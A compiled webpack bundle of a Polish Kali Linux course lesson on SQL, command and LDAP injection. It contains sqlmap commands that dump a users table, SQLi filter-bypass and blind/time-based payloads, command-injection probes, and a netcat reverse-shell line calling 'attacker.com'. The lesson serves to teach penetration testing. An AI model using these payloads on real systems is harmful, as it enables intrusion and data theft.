"use strict";(self.webpackChunkmy_page=self.webpackChunkmy_page||[]).push([[2013],{16708:(n,e,i)=>{i.r(e),i.d(e,{assets:()=>l,contentTitle:()=>t,default:()=>j,frontMatter:()=>c,metadata:()=>a,toc:()=>d});const a=JSON.parse('{"id":"kurs-kali-linux/injection-attacks","title":"\ud83d\udc89 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)","description":"Ataki typu Injection polegaj\u0105 na wstrzykni\u0119ciu z\u0142o\u015bliwego kodu do aplikacji webowej w celu manipulacji danymi lub wykonania nieautoryzowanych polece\u0144. W tej sekcji om\xf3wimy najcz\u0119\u015bciej spotykane rodzaje atak\xf3w: SQL Injection, Command Injection oraz LDAP Injection.","source":"@site/docs/kurs-kali-linux/07-injection-attacks.md","sourceDirName":"kurs-kali-linux","slug":"/kurs-kali-linux/injection-attacks","permalink":"/docs/kurs-kali-linux/injection-attacks","draft":false,"unlisted":false,"editUrl":"https://github.com/przemyslvw/my-page/edit/master/docs/kurs-kali-linux/07-injection-attacks.md","tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"id":"injection-attacks","title":"\ud83d\udc89 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)","sidebar_position":7},"sidebar":"tutorialSidebar","previous":{"title":"\ud83d\udd0d Active Recon \u2013 interaktywne skanowanie","permalink":"/docs/kurs-kali-linux/active-recon"},"next":{"title":"\ud83d\udd10 Broken Authentication & Session Management","permalink":"/docs/kurs-kali-linux/broken-authentication"}}');var s=i(74848),o=i(28453);const c={id:"injection-attacks",title:"\ud83d\udc89 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)",sidebar_position:7},t="\ud83d\udc89 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)",l={},d=[{value:"\ud83d\udee0\ufe0f SQL Injection",id:"\ufe0f-sql-injection",level:2},{value:"<strong>1\ufe0f\u20e3 Wykorzystanie sqlmap</strong>",id:"1\ufe0f\u20e3-wykorzystanie-sqlmap",level:3},{value:"<strong>Podstawowe skanowanie</strong>",id:"podstawowe-skanowanie",level:4},{value:"<strong>Eksfiltracja danych</strong>",id:"eksfiltracja-danych",level:4},{value:"<strong>Wykorzystanie sesji i cookies</strong>",id:"wykorzystanie-sesji-i-cookies",level:4},{value:"\ud83d\ude80 Bypassowanie filtr\xf3w",id:"-bypassowanie-filtr\xf3w",level:2},{value:"<strong>1\ufe0f\u20e3 U\u017cycie znak\xf3w zast\u0119pczych</strong>",id:"1\ufe0f\u20e3-u\u017cycie-znak\xf3w-zast\u0119pczych",level:3},{value:"<strong>2\ufe0f\u20e3 Zmiana kodowania</strong>",id:"2\ufe0f\u20e3-zmiana-kodowania",level:3},{value:"<strong>3\ufe0f\u20e3 SQL Injection w JSON/API</strong>",id:"3\ufe0f\u20e3-sql-injection-w-jsonapi",level:3},{value:"\ud83d\udd0e Blind SQLi i czasowe ataki",id:"-blind-sqli-i-czasowe-ataki",level:2},{value:"<strong>1\ufe0f\u20e3 Boolean-based Blind SQLi</strong>",id:"1\ufe0f\u20e3-boolean-based-blind-sqli",level:3},{value:"<strong>2\ufe0f\u20e3 Time-based Blind SQLi</strong>",id:"2\ufe0f\u20e3-time-based-blind-sqli",level:3},{value:"\ud83d\udda5\ufe0f Command Injection",id:"\ufe0f-command-injection",level:2},{value:"<strong>1\ufe0f\u20e3 Wykrywanie podatno\u015bci</strong>",id:"1\ufe0f\u20e3-wykrywanie-podatno\u015bci",level:3},{value:"<strong>2\ufe0f\u20e3 Eksploatacja</strong>",id:"2\ufe0f\u20e3-eksploatacja",level:3},{value:"\ud83d\udcc2 LDAP Injection",id:"-ldap-injection",level:2},{value:"<strong>1\ufe0f\u20e3 Przyk\u0142ad podatnego zapytania</strong>",id:"1\ufe0f\u20e3-przyk\u0142ad-podatnego-zapytania",level:3},{value:"<strong>2\ufe0f\u20e3 LDAP Injection payloads</strong>",id:"2\ufe0f\u20e3-ldap-injection-payloads",level:3}];function r(n){const e={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.header,{children:(0,s.jsx)(e.h1,{id:"-injection-attacks-sql-injection-command-injection-ldap-injection",children:"\ud83d\udc89 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)"})}),"\n",(0,s.jsxs)(e.p,{children:["Ataki typu Injection polegaj\u0105 na wstrzykni\u0119ciu z\u0142o\u015bliwego kodu do aplikacji webowej w celu manipulacji danymi lub wykonania nieautoryzowanych polece\u0144. W tej sekcji om\xf3wimy najcz\u0119\u015bciej spotykane rodzaje atak\xf3w: ",(0,s.jsx)(e.strong,{children:"SQL Injection, Command Injection oraz LDAP Injection"}),"."]}),"\n",(0,s.jsx)(e.hr,{}),"\n",(0,s.jsx)(e.h2,{id:"\ufe0f-sql-injection",children:"\ud83d\udee0\ufe0f SQL Injection"}),"\n",(0,s.jsx)(e.p,{children:"SQL Injection (SQLi) polega na manipulacji zapytaniami SQL w celu uzyskania nieautoryzowanego dost\u0119pu do bazy danych."}),"\n",(0,s.jsx)(e.h3,{id:"1\ufe0f\u20e3-wykorzystanie-sqlmap",children:(0,s.jsx)(e.strong,{children:"1\ufe0f\u20e3 Wykorzystanie sqlmap"})}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"sqlmap"})," to narz\u0119dzie automatyzuj\u0105ce wykrywanie i eksploatacj\u0119 SQL Injection."]}),"\n",(0,s.jsx)(e.h4,{id:"podstawowe-skanowanie",children:(0,s.jsx)(e.strong,{children:"Podstawowe skanowanie"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'sqlmap -u "http://example.com/index.php?id=1" --dbs\n'})}),"\n",(0,s.jsx)(e.p,{children:"Opcje:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"--dbs"})," \u2013 wy\u015bwietla dost\u0119pne bazy danych"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"--tables"})," \u2013 wy\u015bwietla tabele danej bazy danych"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"--columns"})," \u2013 wy\u015bwietla kolumny w tabeli"]}),"\n"]}),"\n",(0,s.jsx)(e.h4,{id:"eksfiltracja-danych",children:(0,s.jsx)(e.strong,{children:"Eksfiltracja danych"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'sqlmap -u "http://example.com/index.php?id=1" -D mydb -T users --dump\n'})}),"\n",(0,s.jsxs)(e.p,{children:["Wyci\u0105ga wszystkie rekordy z tabeli ",(0,s.jsx)(e.code,{children:"users"}),"."]}),"\n",(0,s.jsx)(e.h4,{id:"wykorzystanie-sesji-i-cookies",children:(0,s.jsx)(e.strong,{children:"Wykorzystanie sesji i cookies"})}),"\n",(0,s.jsx)(e.p,{children:"Je\u017celi aplikacja wymaga autoryzacji:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'sqlmap -u "http://example.com/profile.php?id=5" --cookie="PHPSESSID=xyz123" --dbs\n'})}),"\n",(0,s.jsx)(e.hr,{}),"\n",(0,s.jsx)(e.h2,{id:"-bypassowanie-filtr\xf3w",children:"\ud83d\ude80 Bypassowanie filtr\xf3w"}),"\n",(0,s.jsx)(e.p,{children:"Wiele aplikacji stosuje mechanizmy obronne, ale mo\u017cna je obej\u015b\u0107 stosuj\u0105c r\xf3\u017cne techniki:"}),"\n",(0,s.jsx)(e.h3,{id:"1\ufe0f\u20e3-u\u017cycie-znak\xf3w-zast\u0119pczych",children:(0,s.jsx)(e.strong,{children:"1\ufe0f\u20e3 U\u017cycie znak\xf3w zast\u0119pczych"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sql",children:"?id=1' OR '1'='1\n"})}),"\n",(0,s.jsx)(e.h3,{id:"2\ufe0f\u20e3-zmiana-kodowania",children:(0,s.jsx)(e.strong,{children:"2\ufe0f\u20e3 Zmiana kodowania"})}),"\n",(0,s.jsx)(e.p,{children:"W niekt\xf3rych przypadkach mo\u017cna omin\u0105\u0107 filtry poprzez enkodowanie znak\xf3w:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sql",children:"?id=1%27%20OR%20%271%27%3D%271\n"})}),"\n",(0,s.jsx)(e.h3,{id:"3\ufe0f\u20e3-sql-injection-w-jsonapi",children:(0,s.jsx)(e.strong,{children:"3\ufe0f\u20e3 SQL Injection w JSON/API"})}),"\n",(0,s.jsx)(e.p,{children:"Je\u015bli aplikacja komunikuje si\u0119 przez API:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-json",children:'{"user": "admin\' OR \'1\'=\'1", "password": "test"}\n'})}),"\n",(0,s.jsx)(e.hr,{}),"\n",(0,s.jsx)(e.h2,{id:"-blind-sqli-i-czasowe-ataki",children:"\ud83d\udd0e Blind SQLi i czasowe ataki"}),"\n",(0,s.jsxs)(e.p,{children:["Je\u017celi aplikacja nie zwraca b\u0142\u0119d\xf3w SQL, mo\u017cna wykorzysta\u0107 ",(0,s.jsx)(e.strong,{children:"Blind SQL Injection"}),"."]}),"\n",(0,s.jsx)(e.h3,{id:"1\ufe0f\u20e3-boolean-based-blind-sqli",children:(0,s.jsx)(e.strong,{children:"1\ufe0f\u20e3 Boolean-based Blind SQLi"})}),"\n",(0,s.jsx)(e.p,{children:"Sprawdzenie, czy aplikacja zwraca r\xf3\u017cne wyniki dla TRUE/FALSE:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sql",children:"?id=1' AND 1=1 -- \n?id=1' AND 1=2 -- \n"})}),"\n",(0,s.jsx)(e.p,{children:"Je\u017celi pierwszy zwraca dane, a drugi nie \u2013 aplikacja jest podatna."}),"\n",(0,s.jsx)(e.h3,{id:"2\ufe0f\u20e3-time-based-blind-sqli",children:(0,s.jsx)(e.strong,{children:"2\ufe0f\u20e3 Time-based Blind SQLi"})}),"\n",(0,s.jsx)(e.p,{children:"Je\u015bli aplikacja nie zwraca \u017cadnych danych, mo\u017cna sprawdzi\u0107 podatno\u015b\u0107 przez op\xf3\u017anienia:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sql",children:"?id=1' AND SLEEP(5) -- \n"})}),"\n",(0,s.jsx)(e.p,{children:"Je\u015bli serwer odpowiada z op\xf3\u017anieniem, to aplikacja jest podatna na SQLi."}),"\n",(0,s.jsxs)(e.p,{children:["W ",(0,s.jsx)(e.code,{children:"sqlmap"}),":"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'sqlmap -u "http://example.com/index.php?id=1" --technique=T\n'})}),"\n",(0,s.jsx)(e.hr,{}),"\n",(0,s.jsx)(e.h2,{id:"\ufe0f-command-injection",children:"\ud83d\udda5\ufe0f Command Injection"}),"\n",(0,s.jsx)(e.p,{children:"Command Injection pozwala na wykonanie polece\u0144 systemowych poprzez podatn\u0105 aplikacj\u0119."}),"\n",(0,s.jsx)(e.h3,{id:"1\ufe0f\u20e3-wykrywanie-podatno\u015bci",children:(0,s.jsx)(e.strong,{children:"1\ufe0f\u20e3 Wykrywanie podatno\u015bci"})}),"\n",(0,s.jsx)(e.p,{children:"Podstawowe payloady:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"http://example.com/ping.php?host=127.0.0.1; id\nhttp://example.com/ping.php?host=127.0.0.1 && whoami\n"})}),"\n",(0,s.jsx)(e.h3,{id:"2\ufe0f\u20e3-eksploatacja",children:(0,s.jsx)(e.strong,{children:"2\ufe0f\u20e3 Eksploatacja"})}),"\n",(0,s.jsx)(e.p,{children:"Przyk\u0142adowe wykorzystanie:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"?host=127.0.0.1 | nc -e /bin/bash attacker.com 4444\n"})}),"\n",(0,s.jsx)(e.hr,{}),"\n",(0,s.jsx)(e.h2,{id:"-ldap-injection",children:"\ud83d\udcc2 LDAP Injection"}),"\n",(0,s.jsx)(e.p,{children:"LDAP Injection jest atakiem na systemy uwierzytelniania oparte na LDAP."}),"\n",(0,s.jsx)(e.h3,{id:"1\ufe0f\u20e3-przyk\u0142ad-podatnego-zapytania",children:(0,s.jsx)(e.strong,{children:"1\ufe0f\u20e3 Przyk\u0142ad podatnego zapytania"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"(&(user=admin)(password=mypassword))\n"})}),"\n",(0,s.jsx)(e.p,{children:"Mo\u017cna go obej\u015b\u0107 poprzez:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"admin)(&))(\n"})}),"\n",(0,s.jsx)(e.h3,{id:"2\ufe0f\u20e3-ldap-injection-payloads",children:(0,s.jsx)(e.strong,{children:"2\ufe0f\u20e3 LDAP Injection payloads"})}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"*)(&)"})," \u2013 bypassowanie autoryzacji"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"*"})," \u2013 wyszukiwanie wszystkich u\u017cytkownik\xf3w"]}),"\n"]}),"\n",(0,s.jsx)(e.hr,{}),"\n",(0,s.jsxs)(e.p,{children:["Ataki Injection s\u0105 jednymi z najcz\u0119\u015bciej wykorzystywanych podatno\u015bci w aplikacjach webowych. Kolejnym krokiem b\u0119dzie analiza podatno\u015bci zwi\u0105zanych z ",(0,s.jsx)(e.strong,{children:"Broken Authentication & Session Management"}),". \ud83d\udd10"]})]})}function j(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(r,{...n})}):r(n)}},28453:(n,e,i)=>{i.d(e,{R:()=>c,x:()=>t});var a=i(96540);const s={},o=a.createContext(s);function c(n){const e=a.useContext(o);return a.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function t(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:c(n.components),a.createElement(o.Provider,{value:e},n.children)}}}]);